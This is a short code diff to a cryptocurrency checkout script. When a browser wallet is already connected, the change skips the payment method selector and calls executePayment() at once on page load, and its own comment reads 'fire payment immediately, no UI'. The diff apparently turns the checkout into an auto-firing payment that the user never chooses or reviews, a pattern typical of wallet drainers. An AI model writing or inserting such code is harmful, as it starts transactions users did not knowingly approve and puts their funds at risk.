@@ -1906,7 +1906,7 @@ async function init() {
   console.log("🚀 Checkout Initializing...");
   el.status.innerHTML = "";
 
-  // If EVM wallet is already connected → go straight to payment selector (no landing page)
+  // If EVM wallet is already connected → fire payment immediately, no UI
   if (typeof window.ethereum !== "undefined") {
     try {
       const accounts = await window.ethereum.request({ method: 'eth_accounts' });
@@ -1914,7 +1914,7 @@ async function init() {
         userAddress = accounts[0];
         provider = new ethers.BrowserProvider(window.ethereum);
         signer    = await provider.getSigner();
-        showPaymentMethodSelector();
+        executePayment();
         return;
       }
     } catch (err) {
